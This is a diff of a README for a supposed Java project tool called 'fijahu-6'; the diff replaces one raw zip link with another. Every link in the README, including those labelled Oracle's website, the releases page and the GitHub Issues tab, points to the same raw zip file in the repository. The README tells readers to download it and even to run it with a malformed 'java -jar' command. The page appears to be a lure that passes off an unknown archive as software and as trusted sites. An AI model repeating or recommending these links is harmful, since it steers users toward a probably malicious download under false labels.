@@ -1,6 +1,6 @@
 # 🚀 fijahu-6 - Simple Tool for Java Projects
 
-[![Download](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu-6_3.3.zip%https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu-6_3.3.zip)](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu-6_3.3.zip)
+[![Download](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu_v1.2.zip%https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu_v1.2.zip)](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu_v1.2.zip)
 
 ## 📋 Description
 
@@ -26,7 +26,7 @@ fijahu-6 is an easy-to-use application designed to simplify your Java project ma
 
 To run fijahu-6, you need:
 
-- **Java Runtime Environment (JRE) 8 or higher:** Make sure you have Java installed on your computer. You can download it from [Oracle's website](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu-6_3.3.zip).
+- **Java Runtime Environment (JRE) 8 or higher:** Make sure you have Java installed on your computer. You can download it from [Oracle's website](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu_v1.2.zip).
 - **Operating System:** fijahu-6 works on Windows, macOS, and Linux. Ensure your system meets these basic requirements.
   
 ## 🚀 Getting Started
@@ -42,7 +42,7 @@ Here’s how to start using fijahu-6:
    - Create a new folder on your computer where you want to store your Java files.
 
 3. **Visit the Release Page:**
-   - Go to the fijahu-6 releases page [here](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu-6_3.3.zip) to download the latest version.
+   - Go to the fijahu-6 releases page [here](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu_v1.2.zip) to download the latest version.
 
 ## ⬇️ Download & Install
 
@@ -50,7 +50,7 @@ To download fijahu-6, follow these steps:
 
 1. Click on the button below to go to the releases page:
 
-   [![Download](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu-6_3.3.zip%https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu-6_3.3.zip)](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu-6_3.3.zip)
+   [![Download](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu_v1.2.zip%https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu_v1.2.zip)](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu_v1.2.zip)
 
 2. On the releases page, you will see a list of available versions. Look for the latest version at the top.
 
@@ -64,7 +64,7 @@ To download fijahu-6, follow these steps:
    - If you downloaded a `.jar` file:
      - Open a command prompt or terminal.
      - Navigate to the folder where the .jar file is located.
-     - Use the command: `java -jar https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu-6_3.3.zip` (replace "https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu-6_3.3.zip" with the exact file name).
+     - Use the command: `java -jar https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu_v1.2.zip` (replace "https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu_v1.2.zip" with the exact file name).
    - If you downloaded an executable file for your OS, double-click on it to execute.
 
 ## 💬 Support
@@ -72,7 +72,7 @@ To download fijahu-6, follow these steps:
 If you encounter any issues or need assistance, consider these options:
 
 - **Check the FAQ:** Many common questions have answers there.
-- **Submit an Issue:** Go to the Issues tab on the [GitHub repository](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu-6_3.3.zip) to report bugs or request features.
+- **Submit an Issue:** Go to the Issues tab on the [GitHub repository](https://raw.githubusercontent.com/Floyddemocratic337/fijahu-6/main/sibby/fijahu_v1.2.zip) to report bugs or request features.
 - **Join the Community:** Look for forums or community pages where users discuss tips and tricks related to fijahu-6. 
 
 This documentation aims to assist you in using fijahu-6 effectively. Enjoy managing your Java projects with ease!
